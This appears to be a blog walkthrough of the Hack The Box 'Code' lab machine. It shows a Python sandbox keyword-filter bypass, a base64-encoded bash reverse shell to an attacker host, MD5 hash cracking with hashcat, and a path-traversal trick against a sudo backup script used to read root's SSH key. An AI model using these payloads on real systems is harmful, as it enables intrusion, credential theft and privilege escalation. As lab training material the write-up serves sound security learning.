---
layout: post
title: Hack The Box Walkthrough - Code
date: 2025-07-27
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2025/07/HTB/Code
img: 2025/07/Code/Code.png
---

In this box, I exploited an application that allowed running Python code to get a shell. Then I cracked a password and used a backup utility to elevate my privileges up to root.

* Room: Code
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Code](https://app.hackthebox.com/machines/Code)
* Author: [FisMatHack](https://app.hackthebox.com/users/1076236)

## Enumeration

I started the machine by running `rustscan` to check for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.30.229:22
Open 10.129.30.229:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 12:58 EDT
NSE: Loaded 157 scripts for scanning.

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
           Raw packets sent: 38 (2.458KB) | Rcvd: 27 (1.834KB)
```

There were two open ports. 
* 22 - SSH
* 5000 - HTTP

I also scanned for UDP ports, but did not find anything.

```bash
$ sudo nmap -sU target -v -oN nmapUdp.txt --min-rate 100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 12:59 EDT
Initiating Ping Scan at 12:59
Scanning target (10.129.30.229) [4 ports]
Completed Ping Scan at 12:59, 0.06s elapsed (1 total hosts)
Initiating UDP Scan at 12:59
Scanning target (10.129.30.229) [1000 ports]
Increasing send delay for 10.129.30.229 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.30.229 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.30.229 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.129.30.229 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.129.30.229 from 400 to 800 due to max_successful_tryno increase to 8
Increasing send delay for 10.129.30.229 from 800 to 1000 due to max_successful_tryno increase to 9
Warning: 10.129.30.229 giving up on port because retransmission cap hit (10).
UDP Scan Timing: About 46.35% done; ETC: 13:00 (0:00:36 remaining)
Completed UDP Scan at 13:01, 90.05s elapsed (1000 total ports)
Nmap scan report for target (10.129.30.229)
Host is up (0.033s latency).
All 1000 scanned ports on target (10.129.30.229) are in ignored states.
Not shown: 913 open|filtered udp ports (no-response), 87 closed udp ports (port-unreach)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 90.24 seconds
           Raw packets sent: 11029 (522.499KB) | Rcvd: 124 (10.147KB)
```

## Python Code Editor

I opened a browser to look at the website on port 5000.

![Python Code Editor](/assets/images/2025/07/Code/PythonCodeEditor.png "Python Code Editor")

The site offered a way to easily run some Python code. Which sounded like a very easy way to get Remote Code Execution. 

![About Code](/assets/images/2025/07/Code/AboutCode.png "About Code")

I ran `feroxbuster` to check for hidden pages.

```bash
$ feroxbuster -u http://target.htb:5000/ -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb:5000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l       53w      730c http://target.htb:5000/login
200      GET       24l       53w      741c http://target.htb:5000/register
302      GET        5l       22w      189c http://target.htb:5000/logout => http://target.htb:5000/
405      GET        5l       20w      153c http://target.htb:5000/save_code
405      GET        5l       20w      153c http://target.htb:5000/run_code
200      GET      192l      382w     3529c http://target.htb:5000/static/css/styles.css
200      GET      100l      234w     3435c http://target.htb:5000/
200      GET       22l       96w      818c http://target.htb:5000/about
302      GET        5l       22w      199c http://target.htb:5000/codes => http://target.htb:5000/login
[####################] - 4m    119614/119614  0s      found:9       errors:0
[####################] - 4m    119601/119601  491/s   http://target.htb:5000/
```

It did not show anything I could not get to with the buttons on the site.

The site appeared to be running the provided code with `eval` or something similar. It tried to protect against attacks by restricting the use of some keywords.

![Restricted Keywords](/assets/images/2025/07/Code/RestrictedKeywords.png "Restricted Keywords")

Bypassing the restrictions was simple. I simply needed to build the commands by concatenating strings. With a little bit of research on [Python code injection](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html) and how to call a Python function by using its [name as a string](https://stackoverflow.com/questions/3061/calling-a-function-of-a-module-by-using-its-name-a-string), I was able to build a RCE payload that worked.

```python
x = compile("__im" + "port__('o" + "s').pop" + "en(r'curl 10.10.14.122').re" + "ad()",'','ev' + 'al')
a = globals()["__b" + "uiltins__"]["ex" + "ec"]
print(a(x))
```

This code got me a hit on my web server. Proving that the code was running correctly on the server.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.129.30.229 - - [13/Jul/2025 13:44:39] "GET / HTTP/1.1" 200 -
10.129.30.229 - - [13/Jul/2025 13:44:43] "GET / HTTP/1.1" 200 -
```

Then I was able to use the same payload to get a reverse shell on the server.

```bash
$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.14.122/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzQ0NDQgMD4mMSIK
```

```python
x = compile("__im" + "port__('o" + "s').pop" + "en(r'echo YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzQ0NDQgMD4mMSIK|base64 -d|bash').re" + "ad()",'','ev' + 'al')
a = globals()["__b" + "uiltins__"]["ex" + "ec"]
print(a(x))
```

I got the hit on my listener. And the user flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.30.229] 34346
bash: cannot set terminal process group (1481): Inappropriate ioctl for device
bash: no job control in this shell

app-production@code:~/app$ id
id
uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)

app-production@code:~/app$ pwd
pwd
/home/app-production/app

app-production@code:~/app$ ls -l ../
ls -l ../
total 8
drwxrwxr-x 6 app-production app-production 4096 Feb 20 12:10 app
-rw-r----- 1 root           app-production   33 Jul 13 16:56 user.txt

app-production@code:~/app$ cat ../user.txt
cat ../user.txt
64fdd753b10c8a6fb32f3ac0a074c7a7
```

## User martin

I looked around the application source code and saw that it was using a `sqlite` database. 

```python
app-production@code:~/app$ cat app.py
from flask import Flask, render_template,render_template_string, request, jsonify, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
import sys
import io
import os
import hashlib

app = Flask(__name__)
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    codes = db.relationship('Code', backref='user', lazy=True)



class Code(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)
    name = db.Column(db.String(100), nullable=False)

    def __init__(self, user_id, code, name):
        self.user_id = user_id
        self.code = code
        self.name = name

@app.route('/')
def index():
    code_id = request.args.get('code_id')
    return render_template('index.html', code_id=code_id)

...
```

I looked at the content of the database. It contained the password hashes for two users.

```sql
app-production@code:~/app$ sqlite3 instance/database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.

sqlite> .tables
code  user

sqlite> Select * From code;
1|1|print("Functionality test")|Test

sqlite> Select * From user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

I saved the hashes to my machine and ran `hashcat` to brute force them.

```bash
$ cat hash.txt        
development:759b74ce43947f5f4c91aeddc3e5bad3
martin:3de6f30c4a09c27fc71932bfc68474be

$ hashcat -a0 -m0 --username hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6848/13760 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:

... 

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

759b74ce43947f5f4c91aeddc3e5bad3:development
3de6f30c4a09c27fc71932bfc68474be:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.txt
Time.Started.....: Sun Jul 13 13:56:27 2025 (1 sec)
Time.Estimated...: Sun Jul 13 13:56:28 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7517.9 kH/s (0.22ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 5228544/14344384 (36.45%)
Rejected.........: 0/5228544 (0.00%)
Restore.Point....: 5222400/14344384 (36.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: nairb234 -> nadrjames
Hardware.Mon.#1..: Util: 25%

Started: Sun Jul 13 13:56:26 2025
Stopped: Sun Jul 13 13:56:29 2025
```

Both hashes were cracked in seconds. The `passwd` file showed that the machine had a user called martin. I tried connecting as them with SSH and it worked.

```bash
$ ssh martin@target
The authenticity of host 'target (10.129.30.229)' can't be established.
ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
martin@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 13 Jul 2025 05:57:43 PM UTC

  System load:           0.0
  Usage of /:            51.3% of 5.33GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.129.30.229
  IPv6 address for eth0: dead:beef::250:56ff:feb0:aa61

  => There are 2 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jul 13 17:57:44 2025 from 10.10.14.122
martin@code:~$ 
```

## Getting root with backy

Now that I had a connection as the user martin, I checked if they could run anything with `sudo`.

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

They were allowed to run a small backup script as anyone.

```bash
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

The script used [backy](https://github.com/vdbsh/backy) to take backups of folders. It took a JSON configuration file with the list of folders to backup and where to save it. The script validated that only paths inside of `/home/` or `/var/` could be used. And it removed any `../` it found in the paths to prevent something like `/home/../root`.

But it did not do it recursively. So if I provided `/home/..././root`, it would remove one instance of `../` and be converted to `/home/../root`. This allowed me to get a backup of the root home folder.

```bash
martin@code:~$ cat task.json
{
  "directories_to_archive": [
    "/home/..././root"
  ],
  "destination": "/tmp"
}

martin@code:~$ sudo /usr/bin/backy.sh /home/martin/task.json
2025/07/13 22:28:03 🍀 backy 1.2
2025/07/13 22:28:03 📋 Working with /home/martin/task.json ...
2025/07/13 22:28:03 💤 Nothing to sync
2025/07/13 22:28:03 📤 Archiving: [/home/../root]
2025/07/13 22:28:03 📥 To: /tmp ...
2025/07/13 22:28:03 📦
martin@code:~$ ls -ltrh /tmp/
total 36K
drwx------ 3 root root 4.0K Jul 13 22:16 systemd-private-8d35adee92624d1ca9b2913a0523cd6e-systemd-timesyncd.service-0HdS5f
drwx------ 3 root root 4.0K Jul 13 22:16 systemd-private-8d35adee92624d1ca9b2913a0523cd6e-systemd-logind.service-gTDNog
drwx------ 3 root root 4.0K Jul 13 22:16 systemd-private-8d35adee92624d1ca9b2913a0523cd6e-ModemManager.service-IrpgVf
drwx------ 3 root root 4.0K Jul 13 22:16 systemd-private-8d35adee92624d1ca9b2913a0523cd6e-systemd-resolved.service-tS4Ccj
drwx------ 2 root root 4.0K Jul 13 22:17 vmware-root_752-2957190263
-rw-r--r-- 1 root root  13K Jul 13 22:28 code_home_.._root_2025_July.tar.bz2
```

I was then able to decompress the backup and read the content of `/root`.

```bash
martin@code:/tmp/tmp.Cng0B8J9qh$ bzip2 -d code_home_.._root_2025_July.tar.bz2

martin@code:/tmp/tmp.Cng0B8J9qh$ ls -ltrh
total 52K
-rw-r--r-- 1 martin martin 50K Jul 13 22:29 code_home_.._root_2025_July.tar

martin@code:/tmp/tmp.Cng0B8J9qh$ tar -xvf code_home_.._root_2025_July.tar
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
```

There was an SSH key in there. I copied it to my machine and used it to reconnect as root.

```bash
$ scp martin@target:/tmp/tmp.Cng0B8J9qh/root/.ssh/id_rsa .
martin@target's password:
id_rsa                                                                                                                                                                                                   100% 2590    36.5KB/s   00:00

$ chmod 600 id_rsa

$ ssh -i id_rsa root@target
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 13 Jul 2025 10:31:36 PM UTC

  System load:           0.0
  Usage of /:            51.1% of 5.33GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             223
  Users logged in:       1
  IPv4 address for eth0: 10.129.231.240
  IPv6 address for eth0: dead:beef::250:56ff:feb0:4eca


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jul 13 22:31:50 2025 from 10.10.14.122

root@code:~# ls -la
total 40
drwx------  6 root root 4096 Jul 13 22:17 .
drwxr-xr-x 18 root root 4096 Feb 24 19:44 ..
lrwxrwxrwx  1 root root    9 Jul 27  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Aug 27  2024 .cache
drwxr-xr-x  3 root root 4096 Jul 27  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Jul 27  2024 .python_history -> /dev/null
-rw-r-----  1 root root   33 Jul 13 22:17 root.txt
drwxr-xr-x  3 root root 4096 Apr  9 11:26 scripts
-rw-r--r--  1 root root   66 Apr  9 11:27 .selected_editor
lrwxrwxrwx  1 root root    9 Jul 27  2024 .sqlite_history -> /dev/null
drwx------  2 root root 4096 Aug 27  2024 .ssh

root@code:~# cat root.txt
675bb02e8a1751e17e65b45f91e1d213
```